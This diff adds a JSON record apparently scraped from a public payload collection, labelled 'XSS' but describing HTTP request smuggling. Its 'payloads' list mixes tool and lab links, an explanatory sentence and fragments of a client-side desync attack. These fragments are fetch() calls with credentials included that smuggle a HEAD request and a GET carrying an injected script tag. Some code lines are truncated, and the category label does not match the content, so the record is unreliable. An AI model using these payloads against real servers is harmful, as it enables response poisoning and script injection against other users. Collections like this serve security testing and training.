@@ -1,0 +1,27 @@
+{
+  "id": "xss-75786e5fbac5",
+  "category": "XSS",
+  "title": "README",
+  "description": "# Request Smuggling\n\n> HTTP Request smuggling occurs when multiple \"things\" process a request, but differ on how they determine where the request starts/ends. This disagreement can be used to interfere with another user's request/response or to bypass security controls. It normally occurs due to prioritising different HTTP headers (Content-Length vs Transfer-Encoding), differences in handling malformed headers (eg whether to ignore headers with unexpected whitespace), due to downgrading requests",
+  "payloads": [
+    "* [HTTP/2 Request Smuggling](#http2-request-smuggling)",
+    "* [bappstore/HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646) - An extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks",
+    "* [defparam/Smuggler](https://github.com/defparam/smuggler) - An HTTP Request Smuggling / Desync testing tool written in Python 3",
+    "* [dhmosfunk/simple-http-smuggler-generator](https://github.com/dhmosfunk/simple-http-smuggler-generator) - This tool is developed for burp suite practitioner certificate exam and HTTP Request Smuggling labs.",
+    "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "fetch('https://www.example.com/redirect', {",
+    "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "location = 'https://www.example.com/'",
+    "`www.example.com` now incorrectly processes the `HEAD` request in the `POST`'s body, instead of the browser's `GET` request, and returns 404 not found with a content-length, before replying to the next misinterpreted third (`GET /x?x=<script>...`) request and finally the browser's actual `GET` request.",
+    "* [PortSwigger - HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)",
+    "* [PortSwigger - HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)",
+    "* [PortSwigger - HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)",
+    "* [PortSwigger - Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)",
+    "* [PortSwigger - Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)",
+    "* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - October 16, 2020](https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Request Smuggling/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
